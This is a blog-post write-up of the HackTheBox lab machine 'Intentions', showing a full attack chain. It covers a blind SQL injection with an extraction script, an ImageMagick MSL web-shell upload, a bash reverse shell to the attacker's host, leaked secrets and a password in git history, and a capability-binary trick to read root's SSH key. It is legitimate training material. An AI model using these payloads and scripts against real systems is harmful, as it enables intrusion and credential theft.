---
layout: post
title:  "Writeup of Intentions (HackTheBox)"
date:   2023-11-18 18:06:00 +0000
categories: hackthebox
author: brun0ne
tags: htb hackthebox intentions SQLI REST
---

# Discovery

10.129.19.92

There a register/login page on port 80.

There is `/.git/` and `/storage/.git/`, but it gives Forbidden on every file.

The server appears to be using the genre list in generating our feed. When we put this as the list:

`food,travel,nature,test'";asda$#()`

And then access `GET /api/v1/gallery/user/feed`:

```
HTTP/1.1 500 Internal Server Error

{
    "message": "Server Error"
}
```

Maybe it's some delayed SQL injection?

Let's try `food,travel,nature,test' and 1=0 and 1='`.

It didn't work - but when the page got refreshed all the spaces vanished, so that's probably why.

`food,travel,nature,test'/**/or/**/1=0/**/or/**/1='` seems to work!

`food,travel,nature'/**/+/**/sleep(2)/**/or/**/1='` sleeps for quite a lot so **it is MySQL**, and is probably ran multiple times.

`sleep(1)` comes back after about **19 s**.

# SQL injection

`food,travel,nature'/**/or/**/(select/**/sleep(1)/**/from/**/users/**/where/**/version()=0)/**/or/**/1='` doesn't error out, so we know that table `users` exists.

If we give it some true statement after `where`, like `1=1`, it does error out but sleeps. 

This is the user info from `/api/v1/auth/user`:

```json
{
  "status": "success",
  "data": {
    "id": 28,
    "name": "test",
    "email": "test@test.com",
    "created_at": "2023-07-01T19:01:43.000000Z",
    "updated_at": "2023-07-01T19:29:52.000000Z",
    "admin": 0,
    "genres": "food,travel,nature'/**/+/**/sleep(2)/**/or/**/1='"
  }
}
```

# Time-based boolean extraction

Wrote `blind.py` for extracting data.

```python
import requests
import sys
import string

URL = "http://intentions.htb"

def get_payload(text):
    payload = "food,travel,nature'/**/or/**/(" + text.replace(" ", "/**/") + ")/**/or/**/1='"
    return payload

def req(payload):
    headers = {
        "Cookie": "token=TOKEN"
    }
    data = {
        "genres":payload
    }
    
    r = requests.post(URL + "/api/v1/gallery/user/genres", json=data, headers=headers)
    if r.status_code != 200:
        print("ERROR NOT 200")
        sys.exit()

    try:
        r = requests.get(URL + "/api/v1/gallery/user/feed", headers=headers, timeout=0.7)
    except requests.exceptions.ReadTimeout:
        return -1
    except requests.exceptions.ConnectTimeout:
        return -2

    return r.status_code

def extract_usernames():
    characters = "$," + string.ascii_lowercase + "_!@#./?^&*" + "0123456789" + string.ascii_lowercase.upper()
    current = ''
    left = len(current) + 1

    TO_EXTRACT = "password"

    while True:
        for c in characters:
            payload = get_payload(f"SELECT sleep(1) from users WHERE BINARY LEFT({TO_EXTRACT}, {left})='{current}{c}' and admin=1 LIMIT 1")
            status = req(payload)

            print(left, current + c, status)

            if status == -1:
                left += 1
                current += c
                break

extract_usernames()
```

Some emails:

```
barbara.goodwin@example.com
chackett@example.com
ellie.moore@example.com
```

`SELECT sleep(1) from users WHERE LEFT(email, {left})='{current}{c}' and admin=1 LIMIT 1`

```
greg@intentions.htb
steve@intentions.htb
```

`SELECT sleep(1) from users WHERE BINARY LEFT(password, {left})='{current}{c}' and admin=1 LIMIT 1`

`BINARY` is needed for this check to be case-sensitive.

```
$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m

$2y$10$5kUXqAfEfAJAn6LRrYlRV.HiwtzSI9yxBbWjUaOi9lOvYvmUVRBMW (my hash for "test")
```

By cracking 'test' it's confirmed that `.\hashcat.exe .\hashes.txt .\test-rockyou.txt -w 3 -m 3200` should work if it's in `rockyou.txt`. (I added "test" to the beginning of the file, to test my known hash)

# More enumeration

- version(): 10.6.12

- user(): laravel@localhost

- database(): intentions

- @@datadir: /var/lib/mysql/

`(SELECT group_concat(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='intentions' AND TABLE_NAME='users')`

```
id,name,email,password,created_at,updated_at,admin,genres
```

`(SELECT table_name FROM information_schema.tables WHERE table_schema = 'intentions' LIMIT 1 OFFSET 0)`

```
gallery_images
personal_access_tokens
migrations
users
```

`(SELECT group_concat(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='intentions' AND TABLE_NAME='personal_access_tokens')`

```
id,tokenable_type,tokenable_id,name,token,abilities,...
```

`(SELECT COUNT(token) from personal_access_tokens)`

```
0
```

# Auth with hashes

`/api/v2/auth/user` exists!

Let's try: `/api/v2/auth/login`

```json
{
    "status":"error",
    "errors": {
        "email": ["The email field is required."],
        "hash": ["The hash field is required."]
    }
}
```

# Admin panel

Let's try `POST /api/v2/auth/login` with:

```json
{
	"email":"greg@intentions.htb",
	"hash":"$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m"
}
```

Now we can access `/admin`.

Image dir: `/var/www/html/intentions/storage/app/public/nature/image.jpg`

`POST /api/v2/admin/image/modify`

```json
{
    "path":"http://10.10.14.38:8000/image.png",
    "effect":"charcoal"
}
```

We get a connection back:

```
10.129.151.231 - - [03/Jul/2023 02:31:18] "GET /image.png HTTP/1.1" 404 -
```


`/opt/feroxbuster --url http://intentions.htb/api/v2/gallery/ -m POST -H 'Cookie: token=TOKEN' -w /opt/seclists/Discovery/Web-Content/raft-large-words.txt -C 404`

```
/api/v2/admin/users
/api/v2/admin/image/modify
/api/v2/admin/image/1

/api/v2/gallery/images
/api/v2/gallery/user/genres
/api/v2/gallery/user/feed

/api/v2/auth/user
/api/v2/auth/login
/api/v2/auth/refresh
/api/v2/auth/logout
```

Let's focus on the **modify** endpoint. No CVE worked so far.

`vid:msl:` hangs the webserver, so maybe [this will work](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/).

```
POST /api/v2/admin/image/modify?effect=swirl&path=vid:msl:/tmp/php*
...

--ABC
Content-Disposition: form-data; name="x"; filename="x.msl"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @system(@$_REQUEST['a']); ?&gt;" />
 <write filename="info:/var/www/html/intentions/storage/app/public/test.php" />
</image>
--ABC--
```

It worked! Now to get a reverse shell (needs to be URL-encoded):

```
GET /storage/test.php?a=bash -c 'bash -i >& /dev/tcp/10.10.14.38/9001 0>&1'
```

# Shell as www-data

`id`

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`/var/www/html/intentions/.env`

```
DB_PASSWORD=02mDWOgsOga03G385!!3Plcx
APP_KEY=base64:YDGHFO792XTVdInb9gGESbGCyRDsAIRCkKoIMwkyHHI=
JWT_SECRET=yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt
```

Let's download and examine the .git directory - after setting up an http server:

- `bash gitdumper.sh http://intentions.htb:31337/.git/ source`

- `git checkout 36b4287cf2fb356d868e71dc1ac90fc8fa99d319`

- `cat tests/Feature/Helper.php`

```
if($admin) {
    $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
    return $res->headers->get('Authorization');
} 
else {
    $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
    return $res->headers->get('Authorization');
}
```

# SSH - greg

`greg:Gr3g1sTh3B3stDev3l0per!1998!` works for SSH!

`user.txt: <redacted>`

`id`

```
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)
```

There is a binary:

```
/opt/scanner/scanner cap_dac_read_search=ep
```

https://man7.org/linux/man-pages/man7/capabilities.7.html

```
Bypass file read permission checks and directory read
                 and execute permission checks
```

`cat dmca_check.sh`

```sh
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
```

**Scanner options:**

```
        Expected output:
        1. Empty if no matches found
        2. A line for every match, example:
                [+] {LABEL} matches {FILE}

  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h
```

Getting a hash of the first character of a file:

`/opt/scanner/scanner -p -c /file/to/read -s anything -l 1'`

We can extract any file by bruteforcing the hash **character by character**.

Wrote [root.py](root.py) to do that.

```python
import subprocess
import hashlib
import string


def check_n(num, path):
    out = subprocess.check_output(['/opt/scanner/scanner', '-p', '-c', f'{path}', '-s', 'test', '-l', f'{num}'])
    return out[:-1].decode().split("has hash")[1].strip()

def bruteforce(path):
    recovered = ""
    characters = "\n= " + "1234567890" + "<>,./\\;:'[]{}()!@#$%^&*|+-" + string.ascii_letters

    while True:
        hit = False
        outhash = check_n(len(recovered)+1, path)

        for c in characters:
            hit = False
            guess = hashlib.md5((recovered + c).encode('utf-8')).hexdigest().strip()

            if outhash == guess:
                recovered += c
                print(recovered)
                hit = True
                break

        if hit is False:
            break
    
    return recovered

outfile = open("/tmp/id_rsa", "w")
res = bruteforce("/root/.ssh/id_rsa")
outfile.write(res)
```

After extracting `/root/.ssh/id_rsa`:

`ssh -i id_rsa root@localhost`

`root.txt: <redacted>`
